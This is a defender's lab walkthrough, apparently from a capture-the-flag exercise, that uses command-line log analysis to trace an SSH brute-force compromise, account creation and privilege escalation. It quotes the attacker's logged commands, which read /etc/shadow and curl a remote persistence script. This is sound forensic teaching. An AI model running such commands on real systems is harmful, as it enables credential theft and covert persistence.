# Brute force via SSH log analysis

## Steps

	- So I know that this was a confluence server that was brute forced via SSH
		○ Below is the single entry from the end of part 2

![image](https://github.com/user-attachments/assets/36551fc4-da86-4bd0-a1a9-0aa44f5dc365)

	- I can infer from this entry that the IP address of the confluence server is: 
		○ 172.31.35.28

	- Because this is a brute force attack, that would mean there is likely LOTS of unsuccessful authentication attempts in this log file
		○ Instead of guessing keywords with grep related to unsuccessful attempts, I'll likely be better off at using the 'cat' command and finding an unsuccessful attempt

	- After using the 'cat auth.log' command again, I can quickly see some unsuccessful login attempts

![image](https://github.com/user-attachments/assets/9358617d-d689-4986-9d47-788a3585ee7f)

	- So I can see the word "Failed", I'll use the command 'grep -i failed auth.log' to narrow this down

![image](https://github.com/user-attachments/assets/edd01f05-3ed9-43d3-9781-41984ffb7782)
![image](https://github.com/user-attachments/assets/eac33a64-d405-4e63-b01c-23154173d245)

	- So above I can see the first and last entries

	- The last entry:
		○ Occurred at 6:31:42
		○ A failed password from backup 65.2.161.68 on port 34856 via SSH

	- A lot of these entries are 'Failed passwords for invalid user {account}'

	- I'm not very interested in invalid users. "Invalid user" means that user does not exist on the server
		○ However these kinds of entries are a good indicator of a generic brute-force or scanning attack that try random or common usernames (like admin, test, root, oracle)
		○ Since the user's don't exist, there's no direct security compromise, just noisy background activity
		○ It's still good to note the patten and try and correlate it with other behavior

	- I'm going to exclude these entries from the output
		○ ' grep -i failed auth.log | grep -v invalid '

![image](https://github.com/user-attachments/assets/dd4f8d22-238e-4dd8-b4cf-1f56651b73b7)

	- Notice the first entry, 'AuthorizedKeysCommand'. This is not a user, let's clean it up a bit more
		○ The only reason it's showing is because it does have the keyword 'failed' later in the entry

	- I can filter with grep to find strings of words as well
		○ I just want to filter for 'failed password'

	- " grep -i 'failed password' auth.log | grep -v invalid "

	- The reason 'failed password' needs to be surrounded with quotations in the command is because there is a space between them

![image](https://github.com/user-attachments/assets/bdbd4b09-9843-47a7-8064-9a41c5e8d8c8)

	- So there are 2 users:
		○ 'backup'
		○ 'root'

	- They all come from the same IP address:
		○ 65.2.161.68

	- Now I want to use the cut command to display just the user field
		○ Instead of guessing what number the user field is, I can just count it out from the output
		○ The user field is field 10
		○ Remember these fields are delimited by a space

	- " grep -i 'failed password' auth.log | grep -v invalid | cut -d ' ' -f 10 "

![image](https://github.com/user-attachments/assets/735336db-ea30-4d42-b21c-877a7e05b7ce)

	- So now that I have a list of the users, I'll use the sort command and de-duplicate these values by using the commands 'sort' and 'uniq'

	- " grep -i 'failed password' auth.log | grep -v invalid | cut -d ' ' -f 10 | sort | uniq -c | sort -nr "

	- 'sort'
		○ Sorts all the usernames alphabetically (also needed before using 'uniq' to count duplicates)

	- 'uniq -c'
		○ Collapses identical lines into one and counts how many times each appears

	- 'sort -nr'
		○ Sorts the counted output
		○ '-n': sorts numerically (by count)
		○ '-r': sorts in reverse order (most frequent usernames at the top)

	- So this command first sorts by alphabetical, and then it will de-duplicate values and then count them. Then finally 'sort -nr' will sort the numerical value from the highest to lowest

![image](https://github.com/user-attachments/assets/7522568f-a4d2-42fd-8be3-5c32cac9e742)

	- So this command was not super necessary for this case, I could of counted it out, but a in real-life scenario there will likely be an enormous amount of entries for the same username and IP addresses

	- There is 9 failed authentications from the user 'backup'
		○ 6 failed authentications from the user 'root'

	- I'll output this to a file named "failed-users.txt"

	- " grep -i 'failed password' auth.log | grep -v invalid | cut -d ' ' -f 10 | sort | uniq -c | sort -nr > failed-users.txt "

![image](https://github.com/user-attachments/assets/aa1df1a8-e9ba-42d0-bcfa-aac3f0943e83)

	- Now that's saved in a file, I'll go ahead and remove the sort commands, and include the fields for the date and time to see the activity 
		○ I'll use a dash and comma in the command to include the range of fields that include the date and time

	- "  grep -i 'failed password' auth.log | grep -v invalid | cut -d ' ' -f 1-4,10 "

![image](https://github.com/user-attachments/assets/c9d927eb-0483-498e-a62f-eb92774eff04)

	- So this cut command is selecting fields 1,2,3,4 AND 10

	- Now I can see the month, day, and time

	- Looking at seconds:
		○ It starts at 06:31:33
		○ It ends at  06:31:42

	- So these failed authentications are happening within seconds
		○ It's good to consider every possible scenario
		○ It could be an actual user trying to log in
		○ It could very well also be an attacker

	- It would be wise to include the source IP address in the output (field 12)

	- "  grep -i 'failed password' auth.log | grep -v invalid | cut -d ' ' -f 1-4,10,12 "

![image](https://github.com/user-attachments/assets/dd6839e0-619f-4183-95bf-21c5fc176cea)

	- This is an external IP address
		○ 65.2.161.68

	- Private (Internal) IP Ranges:
		○ These are NOT routable on the internet (used inside networks)
		○ 10.0.0.0 - 10.255.255.255
		○ 172.16.0.0 - 172.31.255.255
		○ 192.168.0.0 - 192.168.255.255

	- Everything else = Public (External)
		○ If it's not one of the above, it's likely a public IP

	- I knew from early that they were all the same IP addresses, but I wanted to provide it in the output to provide clarity on the task at hand

	- So now that I'm sure that all of the failed authentications are coming from this IP address.  I'll perform some OSINT using ipinfo.io
		○ This is a website that provides information on a IP address
		○ Since it's a public IP address, it should give us some more information

	- So instead of opening a browser and navigating to the website, I'll access it through the CLI using the 'curl' command

	- " curl ipinfo.io/65.2.161.68 "

	- 'curl' = Client URL
		○ It sends a request to a URL (a website) and shows the response in the terminal
		○ By default: sends an HTTP GET request
		○ Shows the HTML/content of the page
		○ Can also do POST,PUT, download files, send headers, etc.

![image](https://github.com/user-attachments/assets/c0795c4b-b11b-4ceb-a2f9-c163e7aae4b4)

	- Hostname:  Related to Amazon AWS
	- City: Mumbai
	- Country: India

	- I can even see the coordinates 

	- So the next question is… were there any SUCCESFUL attempts coming from THIS IP address?
		○ I'll use grep once again

	- So I know from early that "Accepted" was associated with successful logins, so I'll use that keyword again in addition to the IP address above

	- " grep -i accepted auth.log | grep 65.2.161.68 "

![image](https://github.com/user-attachments/assets/4ab90ca0-c4fc-44e9-b36d-8c3cfe719259)

	- I can see that there is 3 successful SSH logins
		○ Two are coming from the successful user 'root'
		○ The other is coming from the user 'cyberjunkie'…

	- The first event occurred on March 6th at 06:31:40
		○ The second event occurred on March 6th at 06:32:44
		○ The last event occurred on March 6th at 06:37:34

	- This is very important 

	- Now I want to take a look at ALL activity associated with this source IP address: 65.2.161.68
		○ I believe some shady business is going on with this IP

	- " grep 65.2.161.68  auth.log "

![image](https://github.com/user-attachments/assets/b80a9342-9dfc-4d12-ae52-bc34da1f4fca)

	- The first event occurred at 06:31:31
		○ The source IP tried to log in with an invalid user of 'admin'

	- Instead of scrolling and possibly missing important information, I'll use the grep command again to search through the information

	- I'll use grep to search for the user 'root'

	- " grep -i root auth.log "

![image](https://github.com/user-attachments/assets/d41337b3-56e7-4090-b122-1377aad816d1)

	- What I'm trying to do is look at the activity leading up to that first successful login from the user 'root' at 06:31:40

	- So if I go that timestamp, I can see the accepted password

	- After the accepted password, I can see new SSH session; session 34 of user root
		○ Whenever successful SSH connections are made, this particular log will track the session
		○ If you look below this log, you can see that the session was closed in less than a second 

	- Now I'll go to the timestamp of the second successful login attempt from 'root' at 06:32:44

![image](https://github.com/user-attachments/assets/7f17213b-a1af-40ab-9a2e-df16a40f7954)

	- After the successful login, I can see this SSH connection logged the session of 37 which also occurred at 06:32:44

	- Notice that a session was opened and closed at 06:35:01 for 'user root'
		○ However this is a 'cron: session'
		○ This is a log entry showing that a "cron job" (scheduled task) started a session
		○ A cron job is a time-based task set to run automatically (like a script every hour)
		○ This cron activity could be related to the source IP address, but right now I'm interested in SSH connections (sshd: session)

	- Notice that the SSH session 37 is closed at 06:37:24

	-  At 06:34:57 I can see that the user 'cyberjunkie' ran a sudo cat command for /etc/shadow
		○ The shadow file contains hashed passwords

	- At 06:39:38 user 'cyberjunkie' ran a sudo curl command, which grabs a shell script from GitHub

![image](https://github.com/user-attachments/assets/bf287373-d4a3-4ace-b90a-438849d12e6e)

	- This is very concerning, I want to see ALL activity related to the user 'cyberjunkie'

	- " grep -i cyberjunkie auth.log "

![image](https://github.com/user-attachments/assets/8b9c9dba-f35e-42c9-82b9-08cbd58735c2)

	- So now I have some really juicy information

	- First event related to user 'cyberjunkie':
		○ Occurred at 06:34:18 
		○ The user group added the name 'cyberjunkie'

	- I can also see 'new user'
		○ This is when the user 'cyberjunkie' was created

	- At 06:34:26 I can see the password was changed

	- At 06:35:15 the user 'cyberjunkie' was added to the group 'sudo'
		○ This means the user now has admin privileges

	- At 06:37:34 the source IP address 65.2.161.68 then logged in using the account of 'cyberjunkie'
		○ The events past this point are the events I observed earlier




What Happened (Step by Step):

	1. Initial Compromise
		○ Attacker brute-forced SSH directly into root (bad SSH config, root login allowed).
		○ That original login happened before cyberjunkie ever existed
		○ Once inside as root, attacker had full control

	2. After gaining access, the attacker:
		○ Created a new user cyberjunkie
		○  Likely to use cyberjunkie for persistence and lower-profile access
		○ Group and shadow files updated.
		○ Home directory set: /home/cyberjunkie
		○ UID: 1002, GID: 1002

	3. User cyberjunkie was added to sudo group:
		○ Gives privilege escalation abilities (can run commands as root).
		○ Then Logged out

	4. Then the attacker logged back in via SSH using cyberjunkie:
		○ From IP 65.2.161.68, port 43260
		○ Password authentication was successful.
		○ SSH session opened.

	5. Commands run with root privileges via sudo:
		○ Read /etc/shadow (contains password hashes)
➜ COMMAND=/usr/bin/cat /etc/shadow
		○ Used curl to fetch a remote shell script:
➜ COMMAND=/usr/bin/curl http://raw.githubusercontent.com/montysecurity/linper/main/linper.sh




Answer to Questions:


![image](https://github.com/user-attachments/assets/237b3264-b51d-4ebb-b7e4-b9772bb16833)
![image](https://github.com/user-attachments/assets/bfacc32b-bc67-42ac-ba61-94459f5ee97f)

Task 3 Answer:

	- **The login time will be different than the authentication time, and can be found in the wtmp artifact.**

	- I need to go back to the terminal and read the wtmp file
		○ Remember that this file tracks successful logins

	- " cat wtmp "

![image](https://github.com/user-attachments/assets/f0243b1e-2d80-43ef-84c1-e8bc1cde9c61)

	- The information is in a weird format that I can't read, I'll have to use another command 'utmpdump' to read the file

	- ' utmpdump wtmp ' 

![image](https://github.com/user-attachments/assets/c694149e-07a6-437f-849b-c0f277b6d270)

	- Just like that it's all cleaned up

	- Notice at the bottom of the file the user 'root' and the source IP of interest '65.2.161.68' 

	- This occurred on 2024, March 6th, at…06:32:45
		○ Why is different than earlier? Remember that the last successful login from 'root' occurred at 06:32:44
		○ Why is wtmp one second ahead of the accepted password entries?

	- It's because wtmp tracks successful logins, but there are delays and 'accepted password' logs (like in auth.log) can be off by a couple seconds
		○ The difference is usually not big

Task 6 Answer:

	- To find the answer I can navigate to the actual MITRE ATT&CK website
		○ attack.mitre.org

![image](https://github.com/user-attachments/assets/7a5252fc-c932-4979-a211-e5186abb7bf2)

	- Then I can look under "Persistence" and try and find the sub-technique

![image](https://github.com/user-attachments/assets/15d47873-eeec-4d7d-8d89-3187b43f41ed)

	- Or I can go to the search and type "new user account"

	- I'll select "User Account, Data Source"

![image](https://github.com/user-attachments/assets/0baf2840-e551-4c4a-a7e2-484264dad9bf)

	- Clicking on it brings up the "User Account" section under the Data sources Window

	- I can see on the left I can see all of the techniques that involve "user account"

![image](https://github.com/user-attachments/assets/b5f8a1b7-7f06-4cef-8c19-53c7df4fbc33)

	- So in the lab I did see that a user account was created, so I'll go ahead and select that option

![image](https://github.com/user-attachments/assets/5d21725f-c69d-4624-81d2-a05bf021b96e)

	- 'cyberjunkie' was most likely a "Local Account"
		○ It has a an ID of .001
		○ I'll go ahead and click on the sub-technique ID

	- This will bring up the "Create Account: Local Account" sub-technique page

![image](https://github.com/user-attachments/assets/9b8090d9-538e-42ec-bc47-05977a61e71f)

	- On the left I can see lots of important information

	- ID: T1136.001
	- Tactic: Persistence
